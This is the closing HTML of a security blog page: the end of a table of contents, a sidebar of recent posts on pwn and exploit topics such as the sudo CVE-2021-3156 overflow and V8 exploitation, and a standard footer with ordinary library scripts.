class="toc-text">checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vul-2"><span class="toc-number">4.2.7.</span> <span class="toc-text">vul</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-4"><span class="toc-number">4.2.8.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/03/31/auto-pwn/" title="AUTO PWN"><img src="/img/text_bg.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="AUTO PWN"/></a><div class="content"><a class="title" href="/2021/03/31/auto-pwn/" title="AUTO PWN">AUTO PWN</a><time datetime="2021-03-31T07:58:43.000Z" title="Created 2021-03-31 15:58:43">2021-03-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/31/cve-2021-3156/" title="Heap-Based Buffer Overflow in Sudo"><img src="/img/text_bg.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Heap-Based Buffer Overflow in Sudo"/></a><div class="content"><a class="title" href="/2021/03/31/cve-2021-3156/" title="Heap-Based Buffer Overflow in Sudo">Heap-Based Buffer Overflow in Sudo</a><time datetime="2021-03-31T07:58:43.000Z" title="Created 2021-03-31 15:58:43">2021-03-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/31/fuzz-afl/" title="Binary fuzzing way of american fuzzy lop"><img src="/img/text_bg.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Binary fuzzing way of american fuzzy lop"/></a><div class="content"><a class="title" href="/2021/03/31/fuzz-afl/" title="Binary fuzzing way of american fuzzy lop">Binary fuzzing way of american fuzzy lop</a><time datetime="2021-03-31T02:00:43.000Z" title="Created 2021-03-31 10:00:43">2021-03-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/30/v8-01/" title="V8 EXPLOIT ONE"><img src="/img/text_bg.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="V8 EXPLOIT ONE"/></a><div class="content"><a class="title" href="/2021/03/30/v8-01/" title="V8 EXPLOIT ONE">V8 EXPLOIT ONE</a><time datetime="2021-03-30T11:28:43.000Z" title="Created 2021-03-30 19:28:43">2021-03-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/26/buu-pwn/" title="BUU PWN"><img src="/img/text_bg.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUU PWN"/></a><div class="content"><a class="title" href="/2021/03/26/buu-pwn/" title="BUU PWN">BUU PWN</a><time datetime="2021-03-26T01:40:43.000Z" title="Created 2021-03-26 09:40:43">2021-03-26</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/text_bg.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By i0gan</div><div class="framework-info"></div><div class="icp"><a target="_blank" rel="noopener" href="http://www.beian.gov.cn/"><img class="icp-icon" src="/img/icp.png" alt="ICP"/><span>黔ICP备20006037号</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>